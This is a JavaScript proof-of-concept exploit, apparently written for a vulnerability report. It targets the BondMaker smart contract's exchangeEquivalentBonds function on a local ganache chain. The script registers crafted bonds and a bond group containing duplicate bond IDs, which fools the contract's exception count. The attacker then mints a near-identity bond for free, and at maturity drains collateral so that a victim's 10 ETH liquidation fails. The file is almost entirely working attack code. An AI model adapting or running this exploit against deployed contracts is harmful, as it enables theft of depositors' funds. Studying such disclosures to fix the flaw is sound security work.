/* PoC: BondMaker.exchangeEquivalentBonds duplicate-bondID exception counting
 * Setup faithful to migrations/10_deploy_bond_maker.js (BondMakerCollateralizedEth,
 * maturityScale=3600 production value from test/constants).
 * Victim deposits 10 ETH into a legit SBT/LBT group. Attacker deposits 1 ETH
 * into crafted group G_in=[B,B,T], then exchangeEquivalentBonds(G_in,G_out,U,[B,C])
 * burns ONLY the near-worthless remainder T and mints the near-identity bond R.
 * At maturity (price 400) attacker extracts ~1.97 ETH for 1 ETH in.
 */
const { ethers } = require('ethers');
const ganache = require('ganache');
const artifacts = require('./artifacts.json');

const BN = ethers.BigNumber;
const fmt = (x) => ethers.utils.formatEther(x);

let provider;
let gasSpentAttacker = BN.from(0);

async function send(txPromise, tag, acctIdx) {
  const tx = await txPromise;
  const r = await tx.wait();
  if (acctIdx !== undefined) {
    const cost = r.gasUsed.mul(tx.gasPrice || BN.from(0));
    gasTrack[acctIdx] = (gasTrack[acctIdx] || BN.from(0)).add(cost);
  }
  console.log(`  [tx] ${tag} gas=${r.gasUsed.toString()} status=${r.status}`);
  return r;
}
const gasTrack = {};

function fnMap(points) {
  // points: [[x1,y1],[x2,y2],...] -> segments from (0,0)
  let prev = [0, 0];
  const segs = [];
  for (const p of points) {
    const z = BN.from(prev[0]).shl(192).or(BN.from(prev[1]).shl(128)).or(BN.from(p[0]).shl(64)).or(BN.from(p[1]));
    segs.push(z.toString());
    prev = p;
  }
  return ethers.utils.defaultAbiCoder.encode(['uint256[]'], [segs]);
}

async function main() {
  const gprovider = ganache.provider({
    logging: { quiet: true },
    chain: { allowUnlimitedContractSize: true },
    miner: { blockGasLimit: 100_000_000, defaultGasPrice: 1_000_000_000 },
    wallet: { totalAccounts: 6, defaultBalance: 1000 },
  });
  provider = new ethers.providers.Web3Provider(gprovider);
  const [deployer, victim, attacker, feeTaker] = [
    provider.getSigner(0), provider.getSigner(1), provider.getSigner(2), provider.getSigner(3),
  ];
  const A = { deployer: await deployer.getAddress(), victim: await victim.getAddress(), attacker: await attacker.getAddress(), feeTaker: await feeTaker.getAddress() };
  console.log('accounts:', A);

  const deploy = async (signer, name, args = []) => {
    const art = artifacts[name];
    const f = new ethers.ContractFactory(art.abi, art.bytecode, signer);
    const c = await f.deploy(...args);
    await c.deployTransaction.wait();
    console.log(`  deployed ${name} @ ${c.address}`);
    return c;
  };
  const at = (name, addr, signer) => new ethers.Contract(addr, artifacts[name].abi, signer);

  // Oracle price raw = 400 (BondMaker treats oracle price as the x coordinate)
  const oracle = await deploy(deployer, 'TestOracle', [400, 0]);
  const namer = await deploy(deployer, 'BondTokenName', []);
  const factory = await deploy(deployer, 'BondTokenFactory', []);
  const MATURITY_SCALE = 3600;
  const maker = await deploy(deployer, 'BondMakerCollateralizedEth',
    [oracle.address, A.feeTaker, namer.address, factory.address, MATURITY_SCALE]);

  const now = (await provider.getBlock('latest')).timestamp;
  const maturity = (Math.floor(now / MATURITY_SCALE) + 2) * MATURITY_SCALE;
  console.log('now=', now, 'maturity=', maturity);

  const makerAtk = at('BondMakerCollateralizedEth', maker.address, attacker);
  const makerVic = at('BondMakerCollateralizedEth', maker.address, victim);

  async function registerBond(points, label, signer = attacker) {
    const m = at('BondMakerCollateralizedEth', maker.address, signer);
    const fm = fnMap(points);
    const bondID = await m.generateBondID(maturity, fm);
    await send(m.registerNewBond(maturity, fm, { gasLimit: 20_000_000 }), `registerNewBond ${label}`);
    const info = await m.getBond(bondID);
    console.log(`  bond ${label} id=${bondID} token=${info[0]}`);
    return { bondID, token: info[0] };
  }

  // Payoffs f(x): breakpoints 100,200,300. 2*fB + fT == x ; 2*fC + fR == x (check: @100 80+20; @200 190+10; @300 290+10 / 0+100;2+198;2+298) tail slopes B .5,T 0,C 0,R 1
  const B = await registerBond([[100, 40], [200, 95], [300, 145]], 'B (valuable, x2 in G_in)');
  const T = await registerBond([[100, 20], [200, 10], [300, 10]], 'T (remainder of G_in, tiny)');
  const C = await registerBond([[100, 0], [200, 1], [300, 1]], 'C (near-worthless, x2 in G_out)');
  const R = await registerBond([[100, 100], [200, 198], [300, 298]], 'R (near-identity, minted by exchange)');
  const SBT = await registerBond([[200, 200], [201, 200]], 'SBT strike200', victim);
  const LBT = await registerBond([[200, 0], [201, 1]], 'LBT strike200', victim);

  async function registerGroup(ids, label, signer = attacker) {
    const m = at('BondMakerCollateralizedEth', maker.address, signer);
    const gid = await m.callStatic.registerNewBondGroup(ids, maturity);
    await send(m.registerNewBondGroup(ids, maturity, { gasLimit: 20_000_000 }), `registerNewBondGroup ${label}`);
    console.log(`  group ${label} id=${gid.toString()}`);
    return gid.toString();
  }

  const G_IN = await registerGroup([B.bondID, B.bondID, T.bondID], 'G_in=[B,B,T]');
  const G_OUT = await registerGroup([R.bondID, C.bondID, C.bondID], 'G_out=[R,C,C]');
  const G_VIC = await registerGroup([SBT.bondID, LBT.bondID], 'G_vic=[SBT,LBT]', victim);

  const bondTok = (addr, s) => at('BondTokenCollateralizedEth', addr, s);
  const bal = async (addr) => provider.getBalance(addr);

  // --- victim deposits 10 ETH ---
  await send(makerVic.issueNewBonds(G_VIC, { value: ethers.utils.parseEther('10'), gasLimit: 20_000_000 }), 'victim issue 10 ETH', 1);

  // --- attacker deposits 1 ETH ---
  const atkEthBeforeDeposit = await bal(A.attacker);
  const gasBefore = gasTrack[2] || BN.from(0);
  await send(makerAtk.issueNewBonds(G_IN, { value: ethers.utils.parseEther('1'), gasLimit: 20_000_000 }), 'attacker issue 1 ETH -> G_in', 2);
  // expected U
  const oneEth = ethers.utils.parseEther('1');
  const feeIssue = oneEth.mul(2).add(1001).div(1002); // divRoundUp(2*C,1002) fee=C*2/1002 r-up => (2C-1)/1002+1
  const feeIssueExact = oneEth.mul(2).sub(1).div(1002).add(1);
  const U = oneEth.sub(feeIssueExact).div(BN.from(10).pow(10));
  console.log('  expected bondAmount U =', U.toString());
  const bBal = await bondTok(B.token, attacker).balanceOf(A.attacker);
  const tBal = await bondTok(T.token, attacker).balanceOf(A.attacker);
  console.log(`  attacker balances: B=${bBal.toString()} (expect 2U=${U.mul(2).toString()}) T=${tBal.toString()} (expect U)`);
  if (!bBal.eq(U.mul(2)) || !tBal.eq(U)) throw new Error('unexpected post-issue balances');
  const bondAmountU = tBal; // use on-chain U

  // --- THE EXPLOIT ---
  console.log('\n>>> exchangeEquivalentBonds(G_in, G_out, U, exceptions=[B, C])');
  await send(makerAtk.exchangeEquivalentBonds(G_IN, G_OUT, bondAmountU, [B.bondID, C.bondID], { gasLimit: 20_000_000 }), 'EXPLOIT exchange', 2);
  const post = {
    B: await bondTok(B.token, attacker).balanceOf(A.attacker),
    T: await bondTok(T.token, attacker).balanceOf(A.attacker),
    C: await bondTok(C.token, attacker).balanceOf(A.attacker),
    R: await bondTok(R.token, attacker).balanceOf(A.attacker),
  };
  console.log(`  post-exchange attacker: B=${post.B} T=${post.T} C=${post.C} R=${post.R}`);
  console.log('  => burned ONLY T, kept 2xB, minted R for free. Exception count check was fooled by duplicates.');

  // --- maturity + oracle print AFTER maturity at price 400 ---
  await provider.send('evm_increaseTime', [maturity - now + 100]);
  await provider.send('evm_mine', []);
  const oracleAny = at('TestOracle', oracle.address, deployer);
  await send(oracleAny.testSetOracleData(400, 0), 'oracle print after maturity price=400');

  const makerBalBeforeLiq = await bal(maker.address);
  console.log('\nBondMaker ETH balance before liquidation:', fmt(makerBalBeforeLiq));

  // attacker liquidates own groups first and burns bond tokens
  await send(makerAtk.liquidateBond(G_IN, 0, { gasLimit: 20_000_000 }), 'liquidate G_in', 2);
  await send(makerAtk.liquidateBond(G_OUT, 0, { gasLimit: 20_000_000 }), 'liquidate G_out', 2);
  await send(bondTok(B.token, attacker).burnAll({ gasLimit: 20_000_000 }), 'attacker burnAll B', 2);
  await send(bondTok(R.token, attacker).burnAll({ gasLimit: 20_000_000 }), 'attacker burnAll R', 2);

  const atkEthAfter = await bal(A.attacker);
  const gasAttackerTotal = (gasTrack[2] || BN.from(0)).sub(gasBefore);
  const atkNet = atkEthAfter.sub(atkEthBeforeDeposit).add(gasAttackerTotal);
  console.log('\n================ RESULT ================');
  console.log('Attacker deposited : 1.000000 ETH');
  console.log('Attacker net PnL (gas added back):', fmt(atkNet), 'ETH');
  console.log('Attacker gross received from burns: ~', fmt(atkNet.add(oneEth)), 'ETH');
  console.log('BondMaker ETH balance after attacker exit:', fmt(await bal(maker.address)));
  console.log('FeeTaker ETH received (fees):', fmt((await bal(A.feeTaker)).sub(ethers.utils.parseEther('1000'))));

  // --- victim tries to liquidate ---
  console.log('\n>>> victim liquidateBond(G_vic) ...');
  try {
    await send(makerVic.liquidateBond(G_VIC, 0, { gasLimit: 20_000_000 }), 'victim liquidate', 1);
    const vicBefore = await bal(A.victim);
    await send(bondTok(SBT.token, victim).burnAll({ gasLimit: 20_000_000 }), 'victim burnAll SBT', 1);
    await send(bondTok(LBT.token, victim).burnAll({ gasLimit: 20_000_000 }), 'victim burnAll LBT', 1);
    const vicAfter = await bal(A.victim);
    console.log('Victim recovered from burns:', fmt(vicAfter.sub(vicBefore)), 'ETH (deposited 10 ETH, entitled ~9.98 ETH)');
  } catch (e) {
    console.log('Victim liquidation REVERTED:', (e.message || '').slice(0, 300));
    console.log('=> victim cannot liquidate: BondMaker was drained first-come-first-served.');
  }
  console.log('Final BondMaker balance:', fmt(await bal(maker.address)), 'ETH');
  console.log('Attacker B/R bond balances now:', (await bondTok(B.token, attacker).balanceOf(A.attacker)).toString(), (await bondTok(R.token, attacker).balanceOf(A.attacker)).toString());

  if (atkNet.lte(0)) { console.error('FAIL: attacker not profitable'); process.exit(2); }
  console.log('\nSUCCESS: permissionless drain. Attacker put 1 ETH, net profit', fmt(atkNet), 'ETH from victim collateral.');
  process.exit(0);
}

main().catch((e) => { console.error(e); process.exit(1); });
